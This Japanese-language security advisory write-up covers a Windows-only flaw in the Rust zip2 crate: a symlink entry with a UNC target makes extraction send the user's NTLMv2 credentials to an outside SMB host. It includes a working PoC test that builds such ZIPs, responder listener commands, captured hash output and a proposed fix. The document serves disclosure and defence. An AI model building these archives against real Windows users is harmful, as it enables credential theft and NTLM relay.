---
title: (Windows only) attacker-controlled symlink target triggers outbound SMB/NTLM authentication via std::fs::metadata() during extraction (GHSA-5qh5-c9fp-66jm)
description: zip クレートの脆弱性．展開処理中に std::fs::metadata() を介して，攻撃者が制御するシンボリックリンクのターゲットが外部への SMB/NTLM 認証を誘発する．
date: 2026-10-24 20:48:00 +0900
categories: [CyberSecurity, Bughunt]
tags: [rust, ghsa, ntlm_credential_leak]
---

> **メンテナの対応:**
> - 本脆弱性は，`SymlinkExtractAction::ExtractNoRestrictions` を使用した場合のリスクとして認識されるべきであり，パッチを行うと既存の正常な機能が壊れる可能性があります．
> - デフォルト経路で脆弱だった `v9.0.0` を Patched として，`>=9.0.0` 以降の `SymlinkExtractAction::ExtractNoRestrictions` 経路で NTLMv2 が漏洩しうるリスクがあるというコメントがドキュメントに記載されました．
> - ドキュメント更新は，`v9.1.0` でリリースされました．
> 	- [docs: Document a risk involving network-share symlink targets on Windows by Pr0methean · Pull Request #1094 · zip-rs/zip2 · GitHub](https://github.com/zip-rs/zip2/pull/1094)
> 	- [Windows: attacker-controlled symlink target triggers outbound SMB/NTLM authentication via std::fs::metadata() during extraction · Advisory · zip-rs/zip2 · GitHub](https://github.com/zip-rs/zip2/security/advisories/GHSA-5qh5-c9fp-66jm)
{: .prompt-info }

### Summary

- **Verified version:**
  - v9.0.4 HEAD `master: f14e745111759ed83c832166c4311c736b9d8500`
  - v9.0.0 pre3 `52165b91140f209ba3076b4dd56f61cabd66e33a`
- **Affected versions:** `>=v1.3.0`
  - `>=v1.3.0, <v9.0.0`: 既定 `extract()` で発火
  - `>=v9.0.0 (v9.0.4 含む)` : `SymlinkExtractAction::ExtractNoRestrictions` 指定時のみ発火
- **Precondition:** Windows のみ (`make_symlink_impl()` の `#[cfg(windows)]` 分岐) なため，Unixは影響しません

Windows 分岐の `make_symlink_impl` は，symlink を作成する前に，ファイルかディレクトリかを判定す目的でアーカイブ由来のターゲット文字列に対して，`std::fs::metadata(target)` を呼び出します．
ターゲットが `\\attacker\share\x` のような UNC パスの場合，`std::fs::metadata()` は内部で `CreateFileW` を呼び，SMB クライアントが当該ホストへ接続を試みます．
この接続に伴い，Windows は自動的に NTLM 認証 (現在のユーザのNTLMv2 チャレンジ応答) を送り得ます．

---

### Details

`ZipArchive::extract() -> make_symlink() -> #[cfg(windows)] make_symlink_impl()` の順番で，ターゲットが検証無しに，`std::fs::metadata` へ渡されています．

**`src/read/extract.rs: make_symlink_impl()` (L86-109)**

```rust
#[cfg(windows)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    use crate::format::functions::is_dir;
    let target = Path::new(OsStr::new(&target_str));
    let target_is_dir_from_archive =
        is_dir(target_str.as_bytes()) && existing_files.contains_key(target_str.as_bytes());
    let target_is_dir = if target_is_dir_from_archive {
        true
    } else if let Ok(meta) = std::fs::metadata(target) {
        meta.is_dir()
    } else {
        false
    };
    if target_is_dir {
        std::os::windows::fs::symlink_dir(target, outpath)?;
    } else {
        std::os::windows::fs::symlink_file(target, outpath)?;
    }
    Ok(())
}
```

### HEAD における各書式の扱い

| ターゲット書式         | std の解釈          | リリース版 (plain `extract`) | HEAD default / InFolder    | HEAD `ExtractNoRestrictions` |
| ---------------------- | ------------------- | ---------------------------- | -------------------------- | ---------------------------- |
| `\\host\share\x`       | `UNC` (絶対)        | metadata へ到達              | `strip_base_prefix` で拒否 | metadata へ到達              |
| `//host/share/x`       | `UNC` (絶対)        | 到達                         | 拒否                       | 到達                         |
| `\\?\UNC\host\share\x` | `VerbatimUNC`       | 到達                         | 拒否                       | 到達                         |
| `\\.\UNC\host\share\x` | `DeviceNS`          | 到達                         | 拒否                       | 到達                         |
| `\??\UNC\host\share\x` | prefix 無 (RootDir) | 到達                         | 拒否 (RootDir 検出)        | 到達                         |

**`src/read/extract.rs: cfg(any(windows, unix)) make_symlink` (L126-151)**

```rust
//...
    let (start, rest) = if target_path.is_absolute() {
        let Some(rest) = crate::path::strip_base_prefix(base, target_path) else {
            return Err(invalid!(
                "make_symlink: Symlink target escapes the destination directory"
            ));
        };
        (base, rest)
    } else {
        // A Windows target such as `C:foo` (relative to the current directory of a
        // drive) or `\foo` (relative to the root of the current drive) is neither
        // absolute nor safely relative: the OS resolves it from somewhere other than
        // the parent of the symlink, so there is nothing meaningful to check here.
        if target_path.components().any(|component| {
            matches!(
                component,
                std::path::Component::Prefix(_) | std::path::Component::RootDir
            )
        }) {
            return Err(invalid!("Invalid symlink target path"));
        }
        let parent = outpath.parent().unwrap_or(base);
        if !parent.starts_with(base) {
            return Err(invalid!("Symlink is not inside the destination directory"));
        }
        (parent, target_path)
    };
//...
```

HEAD のデフォルト (`ExtractRecursiveInFolder`) / `ExtractInFolder` では，`make_symlink` (`src/read/extract.rs: L126-151`) で絶対パスターゲットが `strip_base_prefix` を通らない限り早期に弾かれ，`make_symlink_impl` には到達しません．

**`src/read/extract.rs: extract_internal` (L510-516)**

```rust
#[cfg(any(unix, windows))]
SymlinkExtractAction::ExtractNoRestrictions => {
    let Ok(target_str) = std::str::from_utf8(&target) else {
        return Err(invalid!("Invalid UTF-8 as symlink target"));
    };
    make_symlink_impl(&outpath, target_str, &self.shared.files)?;
}
```

`src/read/extract.rs: L510-516` が `make_symlink_impl` を直接呼ぶため，HEAD に残るのは **明示的な `ExtractNoRestrictions`** 経路のみです．

#### Root Cause

1. `std::fs::metadata()` は symlink 作成より前に実行されます．
   windows 環境における symlink 作成には **`SeCreateSymbolicLinkPrivilege` (管理者・開発者モード)** が必要ですが，一般ユーザ権限でも `metadata()` には到達します．
   そのため，`symlink_file()` が権限不足で失敗しても，その時点で SMB 接続・認証は発生し得ます．
2. ターゲットの UTF-8 妥当性以外，`make_symlink()` / `make_symlink_impl()` には (デフォルト経路を除き) ターゲットの内容検証がありません．

---

### PoC

Windows 実機で検証するための最小 PoC を用意しました．(`tests/poc_windows_ntlm.rs`)
検証先ホストは **環境変数 `ZIP2_POC_UNC_HOST` で検証者自身が指定** します．
検証者が自分で立てた SMB リスナへ向けて実行してください．

- `unc_target_triggers_metadata_before_symlink_creation()`: `>=v1.3.0, <v9.0.0` 用
- `unc_target_via_no_restrictions_head_only()`: `>=v9.0.0, HEAD` 用

```rust
//! Windows PoC:
//! A symlink entry's UNC target triggers outbound SMB/NTLM authentication.
//!
//! - author: sl91994
//!
//! Mechanism:
//! On Windows, `make_symlink_impl` calls `std::fs::metadata` on the attacker-controlled
//! target before creating the symlink. If the target is a UNC path, the Windows SMB
//! client connects and authenticates.
//!
//! Usage:
//!   1. Start an SMB listener on the attacker machine (e.g.):
//!        `responder -I <iface> -v`
//!   2. Set the attacker's IP/name via an environment variable and run on the Windows (victim) host:
//!        `set ZIP2_POC_UNC_HOST=<attacker_ip>`
//!        `cargo test --test poc_windows_ntlm unc_target_via_no_restrictions_head_only -- --nocapture --ignored`
//!        `cargo test --test poc_windows_ntlm unc_target_triggers_metadata_before_symlink_creation -- --nocapture --ignored`
//!   3. NTLMv2 authentication arrives at the listener.

#![cfg(windows)]

use std::io::{Cursor, Write};
use std::path::Path;

use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipArchive, ZipWriter};

/// Build a ZIP containing a single symlink entry.
fn build_zip_with_symlink(name: &str, target: &str) -> Vec<u8> {
    let opt = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    zip.add_symlink(name, target, opt).unwrap();
    // metadata() is called on the target itself before the symlink is created.
    zip.finish().unwrap().into_inner()
}

fn report_link_state(link: &Path) {
    match std::fs::symlink_metadata(link) {
        Ok(m) => println!(
            "link entry exists: is_symlink={}, is_file={}",
            m.file_type().is_symlink(),
            m.is_file()
        ),
        Err(e) => println!("link entry not created ({e}); metadata() may still have run"),
    }
}

/// v9.0.0 pre3 and earlier.
#[test]
#[ignore = "involving outbound SMB connections"]
fn unc_target_triggers_metadata_before_symlink_creation() {
    let host = std::env::var("ZIP2_POC_UNC_HOST").expect(
        "set the target host in ZIP2_POC_UNC_HOST (the IP/HOST of an SMB listener the tester controls)",
    );
    // The UNC path, share name, and file name are arbitrary.
    let target = format!(r"\\{host}\share\probe");
    println!("symlink target = {target}");

    let buf = build_zip_with_symlink("link", &target);

    let dest = std::env::temp_dir().join("zip2_poc_ntlm");
    let _ = std::fs::remove_dir_all(&dest);
    std::fs::create_dir_all(&dest).unwrap();

    // In release builds (v1.3.0+), a plain extract() enters this path.
    let res = ZipArchive::new(Cursor::new(buf)).unwrap().extract(&dest);
    println!("extract() returned: {res:?}");

    // The success of extract() does not matter (even if symlink creation fails due to
    // insufficient privileges, the preceding metadata() still triggers the SMB/NTLM connection).
    report_link_state(&dest.join("link"));
}

/// To test the ExtractNoRestrictions path: v9.0.0 and later (including v9.0.4).
#[test]
#[ignore = "involving outbound SMB connections"]
fn unc_target_via_no_restrictions_head_only() {
    // Older versions lack this API and would fail to compile, so uncomment only on HEAD.
    use zip::read::{ExtractOptions, SymlinkExtractAction};
    let host = std::env::var("ZIP2_POC_UNC_HOST").expect("set ZIP2_POC_UNC_HOST");
    let target = format!(r"\\{host}\share\probe");
    let buf = build_zip_with_symlink("link", &target);
    let dest = std::env::temp_dir().join("zip2_poc_ntlm_head");
    let _ = std::fs::remove_dir_all(&dest);
    std::fs::create_dir_all(&dest).unwrap();
    let res = ZipArchive::new(Cursor::new(buf))
        .unwrap()
        .extract_with_options(
            &dest, ExtractOptions::default().symlink_action(SymlinkExtractAction::ExtractNoRestrictions),
        );
    println!("extract_with_options(NoRestrictions) returned: {res:?}");
}
```

PoCの検証には，**Windows11 (Victim VM) と Ubuntu (Attacker VM)** とホストオンリーネットワーク，ポイズニングを無効化したresponderを使用しました．
また，以下のバージョンにおいて検証を行い，いずれも NTLMv2 認証が行われることを確認しました．

- **legacy `unc_target_triggers_metadata_before_symlink_creation()`:** v9.0.0 pre3 `4e15a847e72dd942a5f0605cf4dd7471d65ba9fc` で確認
- **head `unc_target_via_no_restrictions_head_only()`:** v9.0.4 `52165b91140f209ba3076b4dd56f61cabd66e33a` で確認

**PoC実行結果**

```shell
# ポイズニング機能は全て Off，HTTP/SMB のみ On
$ sudo python3 Responder.py -I ens33 -v

# Legacy
[SMB] NTLMv2-SSP Client   : <victim_ip>
[SMB] NTLMv2-SSP Username : .\victim
[SMB] NTLMv2-SSP Hash     : victim::.:XXXX:XXXX:XXXX
# HEAD
[SMB] NTLMv2-SSP Client   : <victim_ip>
[SMB] NTLMv2-SSP Username : .\victim
[SMB] NTLMv2-SSP Hash     : victim::.:XXXX:XXXX:XXXX
```

### WebDAV の検証 (445/tcp が防御されている場合)

IPアドレス直書き (例: `<attacker_ip>@80 / <attacker>@SSL@443`) の場合はWebDAVの自動NTLMは行われません．
この経路が悪用されうるのは，IPアドレスではなく，**ドット無しの単一のラベル名が Attacker に解決可能 (Intranet Zone)** な場合のみです．

これらをポイズニングで満たす場合は，Attacker と Victim が **同一のL2セグメントに存在すること** が前提になります．
ポイズニングを使用しない場合は，Victimの設定を変更する権限が必要になるため，攻撃は現実的に困難です．

- **SMB:** IPのみで悪用可能
- **WebDAV:** ゾーン依存

---

### Impact

攻撃者はコンピュータ名や資格情報を知る必要が無く，被害者に悪意のある ZIP を Windows 上で展開させることで，被害者ホストから攻撃者の SMB サーバ認証情報を送らせることが可能です．
取得した NTLMv2 レスポンスはオフラインクラックや NTLM relay に利用され得ます．

最新のリリースバージョンにおいては，以下が成立していることが前提になります．

- 上流が，`SymlinkExtractAction::ExtractNoRestrictions` を明示的に有効化していること．(デフォルトの `ExtractRecursiveInFolder` では発火しない)
- 上流が，445/tcp でのアウトバウンド通信を遮断していないこと．(又は同一のL2セグメントに存在すること)

---

### Suggested Fix

根本原因は，`make_symlink_impl` (windows) が dir/file の種別判定のためだけに，攻撃者制御の `target` 文字列へ `std::fs::metadata()` を実行する点にあります．
dir/file の区別は _生成される symlink の種別_ (`symlink_dir` / `symlink_file`) にしか影響せず，安全性には無関係です．

したがって **ファイルシステムを一切触らずにアーカイブ内情報だけで種別を決め，不明な場合は file symlink にフォールバック** することで，SMB/WebDAV へ接続される副作用を排除することができます．

この関数は legacy の default 経路と HEAD の `ExtractNoRestrictions` 経路の双方が通る唯一のポイントなので，この修正で両バージョンの発火経路を塞ぐことができます．

```rust
#[cfg(windows)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    use crate::format::functions::is_dir;
    let target = Path::new(OsStr::new(&target_str));

    // Decide dir-vs-file WITHOUT touching the filesystem.
    // The dir/file distinction only affects the *kind* of symlink created,
    // never safety, so derive it from archive metadata alone and fall back to a
    // file symlink when the target is not a known in-archive directory.
    let target_is_dir =
        is_dir(target_str.as_bytes()) && existing_files.contains_key(target_str.as_bytes());

    if target_is_dir {
        std::os::windows::fs::symlink_dir(target, outpath)?;
    } else {
        std::os::windows::fs::symlink_file(target, outpath)?;
    }
    Ok(())
}
```

修正後にPoCを動作させ，NTLM関連のパケットが送られず，認証が行われないことを確認しました．

#### 挙動上の変更とトレードオフ

- アーカイブ内に末尾スラッシュ付きエントリとして存在しない **実在のローカルディレクトリ** を指す symlink は，従来の dir symlink ではなく file symlink として作成されます．
- Windows では file symlink でもリンク先パスは正しく指すため，解決自体は多くの場合動作します．
